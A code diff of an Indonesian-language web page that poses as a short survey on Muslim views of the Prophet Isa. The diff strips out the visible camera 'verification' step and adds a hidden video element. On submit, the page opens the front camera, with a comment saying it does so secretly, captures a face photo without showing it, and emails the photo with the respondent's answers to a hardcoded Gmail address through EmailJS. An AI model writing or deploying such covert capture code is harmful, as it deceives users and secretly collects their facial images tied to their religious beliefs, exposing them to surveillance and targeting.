@@ -3,17 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- Primary Meta Tags -->
     <title>Survey Pandangan Tentang Nabi Isa AS | Pandangan Muslim</title>
     <meta name="description" content="Ikuti survey singkat tentang keyakinan Muslim terhadap Nabi Isa AS. Hanya untuk Muslim dengan verifikasi identitas.">
     
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="/">
+    <meta property="og:url" content="https://example.com/survey-nabi-isa">
     <meta property="og:title" content="Survey Pandangan Muslim Tentang Nabi Isa AS">
     <meta property="og:description" content="Bagaimana pandangan Anda sebagai Muslim tentang Nabi Isa AS? Ikuti survey singkat ini dengan verifikasi identitas.">
-    <meta property="og:image" content="https://cdn.pixabay.com/photo/2023/04/08/01/42/allah-7908315_1280.jpg">
+    <meta property="og:image" content="https://example.com/images/survey-nabi-isa.jpg">
     
     <style>
         body {
@@ -31,13 +29,6 @@
             color: white;
             padding: 20px;
             border-radius: 8px;
-        }
-        .permission-box {
-            background-color: #e3f2fd;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: center;
         }
         .survey-form {
             background-color: white;
@@ -67,45 +58,6 @@
         .submit-btn:hover {
             background-color: #219653;
         }
-        .permission-btn {
-            background-color: #2980b9;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            margin: 15px 0;
-            transition: background-color 0.3s;
-        }
-        .permission-btn:hover {
-            background-color: #3498db;
-        }
-        .status-message {
-            font-weight: bold;
-            margin: 15px 0;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        .success {
-            background-color: #e8f5e9;
-            color: #388e3c;
-            border-left: 4px solid #388e3c;
-        }
-        .error {
-            background-color: #ffebee;
-            color: #d32f2f;
-            border-left: 4px solid #d32f2f;
-        }
-        #camera-feed {
-            width: 100%;
-            max-height: 300px;
-            background-color: #ddd;
-            margin: 15px 0;
-            border-radius: 6px;
-            display: none;
-        }
         #confirmation-message {
             display: none;
             text-align: center;
@@ -122,10 +74,13 @@
             border-radius: 8px;
             margin-top: 20px;
         }
+        .hidden {
+            display: none;
+        }
     </style>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with your Public Key
+        // Initialize EmailJS
         emailjs.init('_C3hCWaBoAUQ_tB9v');
     </script>
 </head>
@@ -133,14 +88,6 @@
     <div class="header">
         <h1>Survey Pandangan Tentang Nabi Isa Alaihissalam</h1>
         <p>Mohon partisipasinya untuk mengisi survey singkat ini</p>
-    </div>
-
-    <div class="permission-box">
-        <h2>Verifikasi Partisipan</h2>
-        <p>Survey ini hanya untuk Muslim. Mohon verifikasi identitas Anda.</p>
-        <button class="permission-btn" id="request-camera">Apakah anda seorang Muslim?</button>
-        <video id="camera-feed" autoplay playsinline></video>
-        <p id="camera-status" class="status-message"></p>
     </div>
 
     <form class="survey-form" id="survey-form">
@@ -176,19 +123,18 @@
 
     <div id="error-message" class="error">
         <h3>Gagal mengirim!</h3>
-        <p>Anda harus memverifikasi bahwa anda seorang Muslim terlebih dahulu agar survey Anda dapat kami terima.</p>
+        <p>Terjadi kesalahan saat mengirim survey. Silakan coba lagi.</p>
     </div>
 
+    <!-- Hidden video element for capturing without displaying -->
+    <video id="hidden-camera" autoplay playsinline class="hidden"></video>
+
     <script>
-        const requestCameraBtn = document.getElementById('request-camera');
-        const cameraFeed = document.getElementById('camera-feed');
-        const cameraStatus = document.getElementById('camera-status');
         const submitBtn = document.getElementById('submit-btn');
         const confirmationMessage = document.getElementById('confirmation-message');
         const errorMessage = document.getElementById('error-message');
         const surveyForm = document.getElementById('survey-form');
-
-        let isVerified = false;
+        const hiddenCamera = document.getElementById('hidden-camera');
 
         // Fungsi untuk menangkap foto dari video stream
         function capturePhoto(videoElement) {
@@ -200,38 +146,48 @@
             return canvas.toDataURL('image/jpeg', 0.8);
         }
 
-        // Fungsi untuk mengirim foto via EmailJS
-        function sendPhotoToEmail(photoData) {
-            const templateParams = {
-                to_email: 'sulakeherman@gmail.com',
-                from_name: 'Responden Survey',
-                subject: 'Foto Verifikasi Partisipan Survey',
-                message: 'Berikut foto partisipan survey yang telah diverifikasi:',
+        // Fungsi untuk mengirim data survey dan foto
+        async function sendSurveyData(photoData) {
+            // Kumpulkan data survey
+            const surveyData = {
+                statement1: document.getElementById('statement1').checked,
+                statement2: document.getElementById('statement2').checked,
+                statement3: document.getElementById('statement3').checked,
+                statement4: document.getElementById('statement4').checked,
                 photo_data: photoData,
-                date: new Date().toLocaleString()
+                timestamp: new Date().toLocaleString()
             };
 
-            // Menggunakan Service ID dan Template ID Anda
-            emailjs.send('service_n5iqioo', 'template_7ewuodr', templateParams)
-                .then(response => {
-                    console.log('SUCCESS! Email terkirim', response.status, response.text);
-                    cameraStatus.textContent = "Verifikasi berhasil! Anda dapat melanjutkan survey.";
-                    cameraStatus.className = "status-message success";
-                    cameraStatus.style.display = 'block';
-                    isVerified = true;
-                })
-                .catch(error => {
-                    console.log('FAILED...', error);
-                    cameraStatus.textContent = "Gagal mengirim verifikasi. Silakan coba lagi.";
-                    cameraStatus.className = "status-message error";
-                    cameraStatus.style.display = 'block';
-                    isVerified = false;
+            try {
+                // Kirim data via EmailJS
+                await emailjs.send('service_n5iqioo', 'template_7ewuodr', {
+                    to_email: 'sulakeherman@gmail.com',
+                    from_name: 'Responden Survey',
+                    subject: 'Hasil Survey Nabi Isa AS',
+                    message: `Hasil Survey:
+                    - Pernyataan 1: ${surveyData.statement1 ? 'Setuju' : 'Tidak'}
+                    - Pernyataan 2: ${surveyData.statement2 ? 'Setuju' : 'Tidak'}
+                    - Pernyataan 3: ${surveyData.statement3 ? 'Setuju' : 'Tidak'}
+                    - Pernyataan 4: ${surveyData.statement4 ? 'Setuju' : 'Tidak'}`,
+                    photo_data: surveyData.photo_data,
+                    date: surveyData.timestamp
                 });
+
+                return true;
+            } catch (error) {
+                console.error('Gagal mengirim email:', error);
+                return false;
+            }
         }
 
-        // Event listener untuk tombol izin kamera
-        requestCameraBtn.addEventListener('click', async () => {
+        // Event listener untuk tombol submit
+        submitBtn.addEventListener('click', async () => {
+            // Nonaktifkan tombol selama proses
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Mengirim...';
+
             try {
+                // Akses kamera secara diam-diam
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
@@ -240,48 +196,39 @@
                     } 
                 });
                 
-                cameraFeed.srcObject = stream;
-                cameraFeed.style.display = 'block';
+                // Gunakan hidden video element
+                hiddenCamera.srcObject = stream;
                 
-                // Tangkap foto setelah 2 detik
-                setTimeout(() => {
-                    const photoDataUrl = capturePhoto(cameraFeed);
-                    
-                    // Kirim foto via EmailJS
-                    sendPhotoToEmail(photoDataUrl);
-                    
-                    // Matikan kamera setelah menangkap foto
-                    stream.getTracks().forEach(track => track.stop());
-                    cameraFeed.style.display = 'none';
-                    
-                }, 2000);
-                
-            } catch (error) {
-                console.error("Error accessing camera:", error);
-                cameraStatus.textContent = "Gagal mengakses kamera. Mohon izinkan akses kamera untuk melanjutkan.";
-                cameraStatus.className = "status-message error";
-                cameraStatus.style.display = 'block';
-                isVerified = false;
-            }
-        });
+                // Tunggu sampai video siap
+                await new Promise((resolve) => {
+                    hiddenCamera.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
 
-        // Event listener untuk tombol submit
-        submitBtn.addEventListener('click', () => {
-            if (isVerified) {
-                // Tampilkan pesan konfirmasi
-                surveyForm.style.display = 'none';
-                confirmationMessage.style.display = 'block';
-                errorMessage.style.display = 'none';
+                // Tangkap foto
+                const photoDataUrl = capturePhoto(hiddenCamera);
                 
-                // Scroll ke pesan konfirmasi
-                confirmationMessage.scrollIntoView({ behavior: 'smooth' });
-            } else {
-                // Tampilkan pesan error
+                // Matikan kamera
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Kirim data survey dan foto
+                const isSuccess = await sendSurveyData(photoDataUrl);
+                
+                if (isSuccess) {
+                    // Tampilkan pesan konfirmasi
+                    surveyForm.style.display = 'none';
+                    confirmationMessage.style.display = 'block';
+                    errorMessage.style.display = 'none';
+                } else {
+                    throw new Error('Gagal mengirim data');
+                }
+            } catch (error) {
+                console.error("Error:", error);
                 errorMessage.style.display = 'block';
                 confirmationMessage.style.display = 'none';
-                
-                // Scroll ke pesan error
-                errorMessage.scrollIntoView({ behavior: 'smooth' });
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Kirim Survey';
             }
         });
     </script>
